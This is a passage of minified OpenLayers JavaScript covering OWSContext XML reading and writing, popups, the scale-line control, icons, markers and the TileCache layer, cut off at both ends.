b&#125;,CLASS_NAME:"OpenLayers.Renderer.SVG"&#125;);OpenLayers.Renderer.SVG.LABEL_ALIGN=&#123;l:"start",r:"end",b:"bottom",t:"hanging"&#125;;OpenLayers.Renderer.SVG.LABEL_VSHIFT=&#123;t:"-70%",b:"0"&#125;;OpenLayers.Renderer.SVG.LABEL_VFACTOR=&#123;t:0,b:-1&#125;;OpenLayers.Renderer.SVG.preventDefault=function(a)&#123;OpenLayers.Event.preventDefault(a)&#125;;OpenLayers.Format.SLD.v1_0_0=OpenLayers.Class(OpenLayers.Format.SLD.v1,&#123;VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/sld http://schemas.opengis.net/sld/1.0.0/StyledLayerDescriptor.xsd",CLASS_NAME:"OpenLayers.Format.SLD.v1_0_0"&#125;);OpenLayers.Format.OWSContext=OpenLayers.Class(OpenLayers.Format.Context,&#123;defaultVersion:"0.3.1",getVersion:function(a,b)&#123;var c=OpenLayers.Format.XML.VersionedOGC.prototype.getVersion.apply(this,arguments);"0.3.0"===c&amp;&amp;(c=this.defaultVersion);return c&#125;,toContext:function(a)&#123;var b=&#123;&#125;;"OpenLayers.Map"==a.CLASS_NAME&amp;&amp;(b.bounds=a.getExtent(),b.maxExtent=a.maxExtent,b.projection=a.projection,b.size=a.getSize(),b.layers=a.layers);return b&#125;,CLASS_NAME:"OpenLayers.Format.OWSContext"&#125;);OpenLayers.Format.OWSContext.v0_3_1=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;owc:"http://www.opengis.net/ows-context",gml:"http://www.opengis.net/gml",kml:"http://www.opengis.net/kml/2.2",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows",sld:"http://www.opengis.net/sld",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,VERSION:"0.3.1",schemaLocation:"http://www.opengis.net/ows-context http://www.ogcnetwork.net/schemas/owc/0.3.1/owsContext.xsd",defaultPrefix:"owc",extractAttributes:!0,xy:!0,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,featureNS:"http://mapserver.gis.umn.edu/mapserver",featureType:"vector",geometryName:"geometry",nestingLayerLookup:null,initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);OpenLayers.Format.GML.v2.prototype.setGeometryTypes.call(this)&#125;,setNestingPath:function(a)&#123;if(a.layersContext)for(var b=0,c=a.layersContext.length;b&lt;c;b++)&#123;var d=a.layersContext[b],e=[],f=a.title||"";a.metadata&amp;&amp;a.metadata.nestingPath&amp;&amp;(e=a.metadata.nestingPath.slice());""!=f&amp;&amp;e.push(f);d.metadata.nestingPath=e;d.layersContext&amp;&amp;this.setNestingPath(d)&#125;&#125;,decomposeNestingPath:function(a)&#123;var b=[];if(OpenLayers.Util.isArray(a))&#123;for(a=a.slice();0&lt;a.length;)b.push(a.slice()),a.pop();b.reverse()&#125;return b&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);this.setNestingPath(&#123;layersContext:b.layersContext&#125;);a=[];this.processLayer(a,b);delete b.layersContext;b.layersContext=a;return b&#125;,processLayer:function(a,b)&#123;if(b.layersContext)for(var c=0,d=b.layersContext.length;c&lt;d;c++)&#123;var e=b.layersContext[c];a.push(e);e.layersContext&amp;&amp;this.processLayer(a,e)&#125;&#125;,write:function(a,b)&#123;this.nestingLayerLookup=&#123;&#125;;b=b||&#123;&#125;;OpenLayers.Util.applyDefaults(b,a);var c=this.writeNode("OWSContext",b);this.nestingLayerLookup=null;this.setAttributeNS(c,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[c])&#125;,readers:&#123;kml:&#123;Document:function(a,b)&#123;b.features=(new OpenLayers.Format.KML(&#123;kmlns:this.namespaces.kml,extractStyles:!0&#125;)).read(a)&#125;&#125;,owc:&#123;OWSContext:function(a,b)&#123;this.readChildNodes(a,b)&#125;,General:function(a,b)&#123;this.readChildNodes(a,b)&#125;,ResourceList:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Layer:function(a,b)&#123;var c=&#123;metadata:&#123;&#125;,visibility:"1"!=a.getAttribute("hidden"),queryable:"1"==a.getAttribute("queryable"),opacity:null!=a.getAttribute("opacity")?parseFloat(a.getAttribute("opacity")):null,name:a.getAttribute("name"),categoryLayer:null==a.getAttribute("name"),formats:[],styles:[]&#125;;b.layersContext||(b.layersContext=[]);b.layersContext.push(c);this.readChildNodes(a,c)&#125;,InlineGeometry:function(a,b)&#123;b.features=[];var c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMember"),d;1&lt;=c.length&amp;&amp;(d=c[0]);d&amp;&amp;d.firstChild&amp;&amp;(c=d.firstChild.nextSibling?d.firstChild.nextSibling:d.firstChild,this.setNamespace("feature",c.namespaceURI),this.featureType=c.localName||c.nodeName.split(":").pop(),this.readChildNodes(a,b))&#125;,Server:function(a,b)&#123;if(!b.service&amp;&amp;!b.version||b.service!=OpenLayers.Format.Context.serviceTypes.WMS)b.service=a.getAttribute("service"),b.version=a.getAttribute("version"),this.readChildNodes(a,b)&#125;,Name:function(a,b)&#123;b.name=this.getChildValue(a);this.readChildNodes(a,b)&#125;,Title:function(a,b)&#123;b.title=this.getChildValue(a);this.readChildNodes(a,b)&#125;,StyleList:function(a,b)&#123;this.readChildNodes(a,b.styles)&#125;,Style:function(a,b)&#123;var c=&#123;&#125;;b.push(c);this.readChildNodes(a,c)&#125;,LegendURL:function(a,b)&#123;var c=&#123;&#125;;b.legend=c;this.readChildNodes(a,c)&#125;,OnlineResource:function(a,b)&#123;b.url=this.getAttributeNS(a,this.namespaces.xlink,"href");this.readChildNodes(a,b)&#125;&#125;,ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows,gml:OpenLayers.Format.GML.v2.prototype.readers.gml,sld:OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld,feature:OpenLayers.Format.GML.v2.prototype.readers.feature&#125;,writers:&#123;owc:&#123;OWSContext:function(a)&#123;var b=this.createElementNSPlus("OWSContext",&#123;attributes:&#123;version:this.VERSION,id:a.id||OpenLayers.Util.createUniqueID("OpenLayers_OWSContext_")&#125;&#125;);this.writeNode("General",a,b);this.writeNode("ResourceList",a,b);return b&#125;,General:function(a)&#123;var b=this.createElementNSPlus("General");this.writeNode("ows:BoundingBox",a,b);this.writeNode("ows:Title",a.title||"OpenLayers OWSContext",b);return b&#125;,ResourceList:function(a)&#123;for(var b=this.createElementNSPlus("ResourceList"),c=0,d=a.layers.length;c&lt;d;c++)&#123;var e=a.layers[c],f=this.decomposeNestingPath(e.metadata.nestingPath);this.writeNode("_Layer",&#123;layer:e,subPaths:f&#125;,b)&#125;return b&#125;,Server:function(a)&#123;var b=this.createElementNSPlus("Server",&#123;attributes:&#123;version:a.version,service:a.service&#125;&#125;);this.writeNode("OnlineResource",a,b);return b&#125;,OnlineResource:function(a)&#123;return this.createElementNSPlus("OnlineResource",&#123;attributes:&#123;"xlink:href":a.url&#125;&#125;)&#125;,InlineGeometry:function(a)&#123;var b=this.createElementNSPlus("InlineGeometry"),c=a.getDataExtent();null!==c&amp;&amp;this.writeNode("gml:boundedBy",c,b);for(var c=0,d=a.features.length;c&lt;d;c++)this.writeNode("gml:featureMember",a.features[c],b);return b&#125;,StyleList:function(a)&#123;for(var b=this.createElementNSPlus("StyleList"),c=0,d=a.length;c&lt;d;c++)this.writeNode("Style",a[c],b);return b&#125;,Style:function(a)&#123;var b=this.createElementNSPlus("Style");this.writeNode("Name",a,b);this.writeNode("Title",a,b);a.legend&amp;&amp;this.writeNode("LegendURL",a,b);return b&#125;,Name:function(a)&#123;return this.createElementNSPlus("Name",&#123;value:a.name&#125;)&#125;,Title:function(a)&#123;return this.createElementNSPlus("Title",&#123;value:a.title&#125;)&#125;,LegendURL:function(a)&#123;var b=this.createElementNSPlus("LegendURL");this.writeNode("OnlineResource",a.legend,b);return b&#125;,_WMS:function(a)&#123;var b=this.createElementNSPlus("Layer",&#123;attributes:&#123;name:a.params.LAYERS,queryable:a.queryable?"1":"0",hidden:a.visibility?"0":"1",opacity:a.hasOwnProperty("opacity")?a.opacity:null&#125;&#125;);this.writeNode("ows:Title",a.name,b);this.writeNode("ows:OutputFormat",a.params.FORMAT,b);this.writeNode("Server",&#123;service:OpenLayers.Format.Context.serviceTypes.WMS,version:a.params.VERSION,url:a.url&#125;,b);a.metadata.styles&amp;&amp;0&lt;a.metadata.styles.length&amp;&amp;this.writeNode("StyleList",a.metadata.styles,b);return b&#125;,_Layer:function(a)&#123;var b,c,d;b=a.layer;c=a.subPaths;d=null;0&lt;c.length?(b=c[0].join("/"),c=b.lastIndexOf("/"),d=this.nestingLayerLookup[b],c=0&lt;c?b.substring(c+1,b.length):b,d||(d=this.createElementNSPlus("Layer"),this.writeNode("ows:Title",c,d),this.nestingLayerLookup[b]=d),a.subPaths.shift(),this.writeNode("_Layer",a,d)):(b instanceof OpenLayers.Layer.WMS?d=this.writeNode("_WMS",b):b instanceof OpenLayers.Layer.Vector&amp;&amp;(b.protocol instanceof OpenLayers.Protocol.WFS.v1?d=this.writeNode("_WFS",b):b.protocol instanceof OpenLayers.Protocol.HTTP?b.protocol.format instanceof OpenLayers.Format.GML?(b.protocol.format.version="2.1.2",d=this.writeNode("_GML",b)):b.protocol.format instanceof OpenLayers.Format.KML&amp;&amp;(b.protocol.format.version="2.2",d=this.writeNode("_KML",b)):(this.setNamespace("feature",this.featureNS),d=this.writeNode("_InlineGeometry",b))),b.options.maxScale&amp;&amp;this.writeNode("sld:MinScaleDenominator",b.options.maxScale,d),b.options.minScale&amp;&amp;this.writeNode("sld:MaxScaleDenominator",b.options.minScale,d),this.nestingLayerLookup[b.name]=d);return d&#125;,_WFS:function(a)&#123;var b=this.createElementNSPlus("Layer",&#123;attributes:&#123;name:a.protocol.featurePrefix+":"+a.protocol.featureType,hidden:a.visibility?"0":"1"&#125;&#125;);this.writeNode("ows:Title",a.name,b);this.writeNode("Server",&#123;service:OpenLayers.Format.Context.serviceTypes.WFS,version:a.protocol.version,url:a.protocol.url&#125;,b);return b&#125;,_InlineGeometry:function(a)&#123;var b=this.createElementNSPlus("Layer",&#123;attributes:&#123;name:this.featureType,hidden:a.visibility?"0":"1"&#125;&#125;);this.writeNode("ows:Title",a.name,b);this.writeNode("InlineGeometry",a,b);return b&#125;,_GML:function(a)&#123;var b=this.createElementNSPlus("Layer");this.writeNode("ows:Title",a.name,b);this.writeNode("Server",&#123;service:OpenLayers.Format.Context.serviceTypes.GML,url:a.protocol.url,version:a.protocol.format.version&#125;,b);return b&#125;,_KML:function(a)&#123;var b=this.createElementNSPlus("Layer");this.writeNode("ows:Title",a.name,b);this.writeNode("Server",&#123;service:OpenLayers.Format.Context.serviceTypes.KML,version:a.protocol.format.version,url:a.protocol.url&#125;,b);return b&#125;&#125;,gml:OpenLayers.Util.applyDefaults(&#123;boundedBy:function(a)&#123;var b=this.createElementNSPlus("gml:boundedBy");this.writeNode("gml:Box",a,b);return b&#125;&#125;,OpenLayers.Format.GML.v2.prototype.writers.gml),ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.writers.ows,sld:OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld,feature:OpenLayers.Format.GML.v2.prototype.writers.feature&#125;,CLASS_NAME:"OpenLayers.Format.OWSContext.v0_3_1"&#125;);OpenLayers.Popup=OpenLayers.Class(&#123;events:null,id:"",lonlat:null,div:null,contentSize:null,size:null,contentHTML:null,backgroundColor:"",opacity:"",border:"",contentDiv:null,groupDiv:null,closeDiv:null,autoSize:!1,minSize:null,maxSize:null,displayClass:"olPopup",contentDisplayClass:"olPopupContent",padding:0,disableFirefoxOverflowHack:!1,fixPadding:function()&#123;"number"==typeof this.padding&amp;&amp;(this.padding=new OpenLayers.Bounds(this.padding,this.padding,this.padding,this.padding))&#125;,panMapIfOutOfView:!1,keepInMap:!1,closeOnMove:!1,map:null,initialize:function(a,b,c,d,e,f)&#123;null==a&amp;&amp;(a=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_"));this.id=a;this.lonlat=b;this.contentSize=null!=c?c:new OpenLayers.Size(OpenLayers.Popup.WIDTH,OpenLayers.Popup.HEIGHT);null!=d&amp;&amp;(this.contentHTML=d);this.backgroundColor=OpenLayers.Popup.COLOR;this.opacity=OpenLayers.Popup.OPACITY;this.border=OpenLayers.Popup.BORDER;this.div=OpenLayers.Util.createDiv(this.id,null,null,null,null,null,"hidden");this.div.className=this.displayClass;this.groupDiv=OpenLayers.Util.createDiv(this.id+"_GroupDiv",null,null,null,"relative",null,"hidden");a=this.div.id+"_contentDiv";this.contentDiv=OpenLayers.Util.createDiv(a,null,this.contentSize.clone(),null,"relative");this.contentDiv.className=this.contentDisplayClass;this.groupDiv.appendChild(this.contentDiv);this.div.appendChild(this.groupDiv);e&amp;&amp;this.addCloseBox(f);this.registerEvents()&#125;,destroy:function()&#123;this.border=this.opacity=this.backgroundColor=this.contentHTML=this.size=this.lonlat=this.id=null;this.closeOnMove&amp;&amp;this.map&amp;&amp;this.map.events.unregister("movestart",this,this.hide);this.events.destroy();this.events=null;this.closeDiv&amp;&amp;(OpenLayers.Event.stopObservingElement(this.closeDiv),this.groupDiv.removeChild(this.closeDiv));this.closeDiv=null;this.div.removeChild(this.groupDiv);this.groupDiv=null;null!=this.map&amp;&amp;this.map.removePopup(this);this.panMapIfOutOfView=this.padding=this.maxSize=this.minSize=this.autoSize=this.div=this.map=null&#125;,draw:function(a)&#123;null==a&amp;&amp;null!=this.lonlat&amp;&amp;null!=this.map&amp;&amp;(a=this.map.getLayerPxFromLonLat(this.lonlat));this.closeOnMove&amp;&amp;this.map.events.register("movestart",this,this.hide);this.disableFirefoxOverflowHack||"firefox"!=OpenLayers.BROWSER_NAME||(this.map.events.register("movestart",this,function()&#123;var a=document.defaultView.getComputedStyle(this.contentDiv,null).getPropertyValue("overflow");"hidden"!=a&amp;&amp;(this.contentDiv._oldOverflow=a,this.contentDiv.style.overflow="hidden")&#125;),this.map.events.register("moveend",this,function()&#123;var a=this.contentDiv._oldOverflow;a&amp;&amp;(this.contentDiv.style.overflow=a,this.contentDiv._oldOverflow=null)&#125;));this.moveTo(a);this.autoSize||this.size||this.setSize(this.contentSize);this.setBackgroundColor();this.setOpacity();this.setBorder();this.setContentHTML();this.panMapIfOutOfView&amp;&amp;this.panIntoView();return this.div&#125;,updatePosition:function()&#123;if(this.lonlat&amp;&amp;this.map)&#123;var a=this.map.getLayerPxFromLonLat(this.lonlat);a&amp;&amp;this.moveTo(a)&#125;&#125;,moveTo:function(a)&#123;null!=a&amp;&amp;null!=this.div&amp;&amp;(this.div.style.left=a.x+"px",this.div.style.top=a.y+"px")&#125;,visible:function()&#123;return OpenLayers.Element.visible(this.div)&#125;,toggle:function()&#123;this.visible()?this.hide():this.show()&#125;,show:function()&#123;this.div.style.display="";this.panMapIfOutOfView&amp;&amp;this.panIntoView()&#125;,hide:function()&#123;this.div.style.display="none"&#125;,setSize:function(a)&#123;this.size=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width),c=c+(e+b.right);this.size.w+=c;this.size.h+=d;"msie"==OpenLayers.BROWSER_NAME&amp;&amp;(this.contentSize.w+=b.left+b.right,this.contentSize.h+=b.bottom+b.top);null!=this.div&amp;&amp;(this.div.style.width=this.size.w+"px",this.div.style.height=this.size.h+"px");null!=this.contentDiv&amp;&amp;(this.contentDiv.style.width=a.w+"px",this.contentDiv.style.height=a.h+"px")&#125;,updateSize:function()&#123;var a="&lt;div class='"+this.contentDisplayClass+"'&gt;"+this.contentDiv.innerHTML+"&lt;/div&gt;",b=this.map?this.map.div:document.body,c=OpenLayers.Util.getRenderedDimensions(a,null,&#123;displayClass:this.displayClass,containerElement:b&#125;),d=this.getSafeContentSize(c),e=null;d.equals(c)?e=c:(c=&#123;w:d.w&lt;c.w?d.w:null,h:d.h&lt;c.h?d.h:null&#125;,c.w&amp;&amp;c.h?e=d:(a=OpenLayers.Util.getRenderedDimensions(a,c,&#123;displayClass:this.contentDisplayClass,containerElement:b&#125;),"hidden"!=OpenLayers.Element.getStyle(this.contentDiv,"overflow")&amp;&amp;a.equals(d)&amp;&amp;(d=OpenLayers.Util.getScrollbarWidth(),c.w?a.h+=d:a.w+=d),e=this.getSafeContentSize(a)));this.setSize(e)&#125;,setBackgroundColor:function(a)&#123;void 0!=a&amp;&amp;(this.backgroundColor=a);null!=this.div&amp;&amp;(this.div.style.backgroundColor=this.backgroundColor)&#125;,setOpacity:function(a)&#123;void 0!=a&amp;&amp;(this.opacity=a);null!=this.div&amp;&amp;(this.div.style.opacity=this.opacity,this.div.style.filter="alpha(opacity="+100*this.opacity+")")&#125;,setBorder:function(a)&#123;void 0!=a&amp;&amp;(this.border=a);null!=this.div&amp;&amp;(this.div.style.border=this.border)&#125;,setContentHTML:function(a)&#123;null!=a&amp;&amp;(this.contentHTML=a);null!=this.contentDiv&amp;&amp;(null!=this.contentHTML&amp;&amp;this.contentHTML!=this.contentDiv.innerHTML)&amp;&amp;(this.contentDiv.innerHTML=this.contentHTML,this.autoSize&amp;&amp;(this.registerImageListeners(),this.updateSize()))&#125;,registerImageListeners:function()&#123;for(var a=function()&#123;null!==this.popup.id&amp;&amp;(this.popup.updateSize(),this.popup.visible()&amp;&amp;this.popup.panMapIfOutOfView&amp;&amp;this.popup.panIntoView(),OpenLayers.Event.stopObserving(this.img,"load",this.img._onImgLoad))&#125;,b=this.contentDiv.getElementsByTagName("img"),c=0,d=b.length;c&lt;d;c++)&#123;var e=b[c];if(0==e.width||0==e.height)e._onImgLoad=OpenLayers.Function.bind(a,&#123;popup:this,img:e&#125;),OpenLayers.Event.observe(e,"load",e._onImgLoad)&#125;&#125;,getSafeContentSize:function(a)&#123;a=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width),c=c+(e+b.right);this.minSize&amp;&amp;(a.w=Math.max(a.w,this.minSize.w-c),a.h=Math.max(a.h,this.minSize.h-d));this.maxSize&amp;&amp;(a.w=Math.min(a.w,this.maxSize.w-c),a.h=Math.min(a.h,this.maxSize.h-d));if(this.map&amp;&amp;this.map.size)&#123;e=b=0;if(this.keepInMap&amp;&amp;!this.panMapIfOutOfView)switch(e=this.map.getPixelFromLonLat(this.lonlat),this.relativePosition)&#123;case "tr":b=e.x;e=this.map.size.h-e.y;break;case "tl":b=this.map.size.w-e.x;e=this.map.size.h-e.y;break;case "bl":b=this.map.size.w-e.x;e=e.y;break;case "br":b=e.x;e=e.y;break;default:b=e.x,e=this.map.size.h-e.y&#125;d=this.map.size.h-this.map.paddingForPopups.top-this.map.paddingForPopups.bottom-d-e;a.w=Math.min(a.w,this.map.size.w-this.map.paddingForPopups.left-this.map.paddingForPopups.right-c-b);a.h=Math.min(a.h,d)&#125;return a&#125;,getContentDivPadding:function()&#123;var a=this._contentDivPadding;a||(null==this.div.parentNode&amp;&amp;(this.div.style.display="none",document.body.appendChild(this.div)),this._contentDivPadding=a=new OpenLayers.Bounds(OpenLayers.Element.getStyle(this.contentDiv,"padding-left"),OpenLayers.Element.getStyle(this.contentDiv,"padding-bottom"),OpenLayers.Element.getStyle(this.contentDiv,"padding-right"),OpenLayers.Element.getStyle(this.contentDiv,"padding-top")),this.div.parentNode==document.body&amp;&amp;(document.body.removeChild(this.div),this.div.style.display=""));return a&#125;,addCloseBox:function(a)&#123;this.closeDiv=OpenLayers.Util.createDiv(this.id+"_close",null,&#123;w:17,h:17&#125;);this.closeDiv.className="olPopupCloseBox";var b=this.getContentDivPadding();this.closeDiv.style.right=b.right+"px";this.closeDiv.style.top=b.top+"px";this.groupDiv.appendChild(this.closeDiv);a=a||function(a)&#123;this.hide();OpenLayers.Event.stop(a)&#125;;OpenLayers.Event.observe(this.closeDiv,"touchend",OpenLayers.Function.bindAsEventListener(a,this));OpenLayers.Event.observe(this.closeDiv,"click",OpenLayers.Function.bindAsEventListener(a,this))&#125;,panIntoView:function()&#123;var a=this.map.getSize(),b=this.map.getViewPortPxFromLayerPx(new OpenLayers.Pixel(parseInt(this.div.style.left),parseInt(this.div.style.top))),c=b.clone();b.x&lt;this.map.paddingForPopups.left?c.x=this.map.paddingForPopups.left:b.x+this.size.w&gt;a.w-this.map.paddingForPopups.right&amp;&amp;(c.x=a.w-this.map.paddingForPopups.right-this.size.w);b.y&lt;this.map.paddingForPopups.top?c.y=this.map.paddingForPopups.top:b.y+this.size.h&gt;a.h-this.map.paddingForPopups.bottom&amp;&amp;(c.y=a.h-this.map.paddingForPopups.bottom-this.size.h);this.map.pan(b.x-c.x,b.y-c.y)&#125;,registerEvents:function()&#123;this.events=new OpenLayers.Events(this,this.div,null,!0);this.events.on(&#123;mousedown:this.onmousedown,mousemove:this.onmousemove,mouseup:this.onmouseup,click:this.onclick,mouseout:this.onmouseout,dblclick:this.ondblclick,touchstart:function(a)&#123;OpenLayers.Event.stop(a,!0)&#125;,scope:this&#125;)&#125;,onmousedown:function(a)&#123;this.mousedown=!0;OpenLayers.Event.stop(a,!0)&#125;,onmousemove:function(a)&#123;this.mousedown&amp;&amp;OpenLayers.Event.stop(a,!0)&#125;,onmouseup:function(a)&#123;this.mousedown&amp;&amp;(this.mousedown=!1,OpenLayers.Event.stop(a,!0))&#125;,onclick:function(a)&#123;OpenLayers.Event.stop(a,!0)&#125;,onmouseout:function(a)&#123;this.mousedown=!1&#125;,ondblclick:function(a)&#123;OpenLayers.Event.stop(a,!0)&#125;,CLASS_NAME:"OpenLayers.Popup"&#125;);OpenLayers.Popup.WIDTH=200;OpenLayers.Popup.HEIGHT=200;OpenLayers.Popup.COLOR="white";OpenLayers.Popup.OPACITY=1;OpenLayers.Popup.BORDER="0px";OpenLayers.Control.ScaleLine=OpenLayers.Class(OpenLayers.Control,&#123;maxWidth:100,topOutUnits:"km",topInUnits:"m",bottomOutUnits:"mi",bottomInUnits:"ft",eTop:null,eBottom:null,geodesic:!1,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);this.eTop||(this.eTop=document.createElement("div"),this.eTop.className=this.displayClass+"Top",this.div.appendChild(this.eTop),this.eTop.style.visibility=""==this.topOutUnits||""==this.topInUnits?"hidden":"visible",this.eBottom=document.createElement("div"),this.eBottom.className=this.displayClass+"Bottom",this.div.appendChild(this.eBottom),this.eBottom.style.visibility=""==this.bottomOutUnits||""==this.bottomInUnits?"hidden":"visible");this.map.events.register("moveend",this,this.update);this.update();return this.div&#125;,getBarLen:function(a)&#123;var b=parseInt(Math.log(a)/Math.log(10)),b=Math.pow(10,b);a=parseInt(a/b);return(5&lt;a?5:2&lt;a?2:1)*b&#125;,update:function()&#123;var a=this.map.getResolution();if(a)&#123;var b=this.map.getUnits(),c=OpenLayers.INCHES_PER_UNIT,d=this.maxWidth*a*c[b],e=1;!0===this.geodesic&amp;&amp;(e=(this.map.getGeodesicPixelSize().w||1E-6)*this.maxWidth/(d/c.km),d*=e);var f,g;1E5&lt;d?(f=this.topOutUnits,g=this.bottomOutUnits):(f=this.topInUnits,g=this.bottomInUnits);var h=d/c[f],k=d/c[g],d=this.getBarLen(h),l=this.getBarLen(k),h=d/c[b]*c[f],k=l/c[b]*c[g],b=h/a/e,a=k/a/e;"visible"==this.eBottom.style.visibility&amp;&amp;(this.eBottom.style.width=Math.round(a)+"px",this.eBottom.innerHTML=l+" "+g);"visible"==this.eTop.style.visibility&amp;&amp;(this.eTop.style.width=Math.round(b)+"px",this.eTop.innerHTML=d+" "+f)&#125;&#125;,CLASS_NAME:"OpenLayers.Control.ScaleLine"&#125;);OpenLayers.Icon=OpenLayers.Class(&#123;url:null,size:null,offset:null,calculateOffset:null,imageDiv:null,px:null,initialize:function(a,b,c,d)&#123;this.url=a;this.size=b||&#123;w:20,h:20&#125;;this.offset=c||&#123;x:-(this.size.w/2),y:-(this.size.h/2)&#125;;this.calculateOffset=d;a=OpenLayers.Util.createUniqueID("OL_Icon_");this.imageDiv=OpenLayers.Util.createAlphaImageDiv(a)&#125;,destroy:function()&#123;this.erase();OpenLayers.Event.stopObservingElement(this.imageDiv.firstChild);this.imageDiv.innerHTML="";this.imageDiv=null&#125;,clone:function()&#123;return new OpenLayers.Icon(this.url,this.size,this.offset,this.calculateOffset)&#125;,setSize:function(a)&#123;null!=a&amp;&amp;(this.size=a);this.draw()&#125;,setUrl:function(a)&#123;null!=a&amp;&amp;(this.url=a);this.draw()&#125;,draw:function(a)&#123;OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,this.size,this.url,"absolute");this.moveTo(a);return this.imageDiv&#125;,erase:function()&#123;null!=this.imageDiv&amp;&amp;null!=this.imageDiv.parentNode&amp;&amp;OpenLayers.Element.remove(this.imageDiv)&#125;,setOpacity:function(a)&#123;OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,null,null,null,null,null,a)&#125;,moveTo:function(a)&#123;null!=a&amp;&amp;(this.px=a);null!=this.imageDiv&amp;&amp;(null==this.px?this.display(!1):(this.calculateOffset&amp;&amp;(this.offset=this.calculateOffset(this.size)),OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,&#123;x:this.px.x+this.offset.x,y:this.px.y+this.offset.y&#125;)))&#125;,display:function(a)&#123;this.imageDiv.style.display=a?"":"none"&#125;,isDrawn:function()&#123;return this.imageDiv&amp;&amp;this.imageDiv.parentNode&amp;&amp;11!=this.imageDiv.parentNode.nodeType&#125;,CLASS_NAME:"OpenLayers.Icon"&#125;);OpenLayers.Marker=OpenLayers.Class(&#123;icon:null,lonlat:null,events:null,map:null,initialize:function(a,b)&#123;this.lonlat=a;var c=b?b:OpenLayers.Marker.defaultIcon();null==this.icon?this.icon=c:(this.icon.url=c.url,this.icon.size=c.size,this.icon.offset=c.offset,this.icon.calculateOffset=c.calculateOffset);this.events=new OpenLayers.Events(this,this.icon.imageDiv)&#125;,destroy:function()&#123;this.erase();this.map=null;this.events.destroy();this.events=null;null!=this.icon&amp;&amp;(this.icon.destroy(),this.icon=null)&#125;,draw:function(a)&#123;return this.icon.draw(a)&#125;,erase:function()&#123;null!=this.icon&amp;&amp;this.icon.erase()&#125;,moveTo:function(a)&#123;null!=a&amp;&amp;null!=this.icon&amp;&amp;this.icon.moveTo(a);this.lonlat=this.map.getLonLatFromLayerPx(a)&#125;,isDrawn:function()&#123;return this.icon&amp;&amp;this.icon.isDrawn()&#125;,onScreen:function()&#123;var a=!1;this.map&amp;&amp;(a=this.map.getExtent().containsLonLat(this.lonlat));return a&#125;,inflate:function(a)&#123;this.icon&amp;&amp;this.icon.setSize(&#123;w:this.icon.size.w*a,h:this.icon.size.h*a&#125;)&#125;,setOpacity:function(a)&#123;this.icon.setOpacity(a)&#125;,setUrl:function(a)&#123;this.icon.setUrl(a)&#125;,display:function(a)&#123;this.icon.display(a)&#125;,CLASS_NAME:"OpenLayers.Marker"&#125;);OpenLayers.Marker.defaultIcon=function()&#123;return new OpenLayers.Icon(OpenLayers.Util.getImageLocation("marker.png"),&#123;w:21,h:25&#125;,&#123;x:-10.5,y:-25&#125;)&#125;;OpenLayers.Layer.TileCache=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;isBaseLayer:!0,format:"image/png",serverResolutions:null,initialize:function(a,b,c,d)&#123;this.layername=c;OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,&#123;&#125;,d]);this.extension=this.format.split("/")[1].toLowerCase();this.extension="jpg"==this.extension?"jpeg":this.extension&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.TileCache(this.name,this.url,this.layername,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getURL:function(a)&#123;var b=this.getServerResolution(),c=this.maxExtent,d=this.tileSize,e=Math.round((a.left-c.left)/(b*d.w));a=Math.round((a.bottom-c.bottom)/(b*d.h));b=null!=this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,b):this.map.getZoom();e=[this.layername,OpenLayers.Number.zeroPad(b,2),OpenLayers.Number.zeroPad(parseInt(e/1E6),3),OpenLayers.Number.zeroPad(parseInt(e/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(e)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a/1E6),3),OpenLayers.Number.zeroPad(parseInt(a/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a)%1E3,3)+"."+this.extension].join("/");b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(e,b));b="/"==b.charAt(b.length-1)?b:b+"/";return b+e&#125;,CLASS_NAME:"OpenLayers.Layer.TileCache"&#125;);OpenLayers.Strategy.Paging=OpenLayers.Class(OpenLayers.Strategy,&#123;features:null,length:10,num:null,paging:!1,activate:function()&#123;var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on(&#123;beforefeaturesadded:this.cacheFeatures,scope:this&#125;);return a&#125;,deactivate:function()&#123;var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.clearCache(),this.layer.events.un(&#123;beforefeaturesadded:this.cacheFeatures,scope:this&#125;));return 